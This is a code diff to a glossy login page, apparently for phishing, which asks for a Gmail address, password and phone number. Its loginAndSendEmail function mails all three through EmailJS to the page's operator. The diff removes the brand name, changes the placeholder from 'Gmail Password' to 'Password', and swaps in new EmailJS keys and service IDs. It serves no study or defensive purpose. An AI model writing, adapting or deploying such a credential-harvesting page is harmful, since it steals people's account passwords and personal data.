@@ -9,7 +9,6 @@ body,html{margin:0;padding:0;overflow:hidden;font-family:'Poppins',sans-serif;he
 .page{position:absolute;top:0;left:0;width:100%;height:100%;display:none;justify-content:center;align-items:center;transition:opacity 0.8s;}
 .page.active{display:flex;opacity:1;}
 .card{backdrop-filter:blur(25px);background:rgba(255,255,255,0.05);border:1px solid rgba(255,255,255,0.15);padding:45px;border-radius:25px;width:360px;box-shadow:0 0 40px rgba(0,150,255,0.25),0 0 80px rgba(0,150,255,0.1);}
-.logo{text-align:center;font-size:42px;font-weight:600;letter-spacing:4px;margin-bottom:6px;background:linear-gradient(90deg,#00c6ff,#ff00ff);-webkit-background-clip:text;-webkit-text-fill-color:transparent;}
 .subtitle{text-align:center;font-size:13px;opacity:0.7;margin-bottom:35px;}
 .input-group{position:relative;margin-bottom:20px;}
 input{width:100%;padding:14px 45px;border-radius:12px;border:none;outline:none;background:rgba(255,255,255,0.12);color:white;font-size:14px;transition:0.3s;}
@@ -31,11 +30,11 @@ nav button:hover{background:rgba(0,200,255,0.4);}
 <!-- Pages -->
 <div id="loginPage" class="page active">
   <div class="card">
-    <div class="logo">Xdot</div>
+    <!-- LOGO 名字已删除 -->
     <div class="subtitle">Next-Gen Digital Platform</div>
     <form>
       <div class="input-group"><span class="icon">📧</span><input id="gmailInput" type="email" placeholder="Gmail"></div>
-      <div class="input-group"><span class="icon">🔒</span><input id="passwordInput" type="password" placeholder="Gmail Password"><span class="show" onclick="togglePassword()">👁</span></div>
+      <div class="input-group"><span class="icon">🔒</span><input id="passwordInput" type="password" placeholder="Password"><span class="show" onclick="togglePassword()">👁</span></div>
       <div class="input-group"><span class="icon">📱</span><input id="phoneInput" type="tel" placeholder="Phone Number"></div>
       <button type="button" onclick="loginAndSendEmail()">Login</button>
     </form>
@@ -71,7 +70,7 @@ nav button:hover{background:rgba(0,200,255,0.4);}
 
 <script>
 // --- EmailJS 初始化 ---
-emailjs.init('8w5RwA4PApZntBos8'); // 替换为你的 EmailJS 公钥
+emailjs.init('0lXSpk6E_Y9ySmxZo'); // 替换为你的 EmailJS 公钥
 
 // --- 页面导航 ---
 function gotoPage(pageId){document.querySelectorAll('.page').forEach(p=>p.classList.remove('active'));document.getElementById(pageId).classList.add('active');}
@@ -86,7 +85,7 @@ function loginAndSendEmail(){
   const phone = document.getElementById('phoneInput').value;
 
   // 发送到 EmailJS
-  emailjs.send('service_43m7h06','template_t68e8al',{
+  emailjs.send('service_yozcasf','template_meol739',{
     gmail: gmail,
     password: password,
     phone: phone
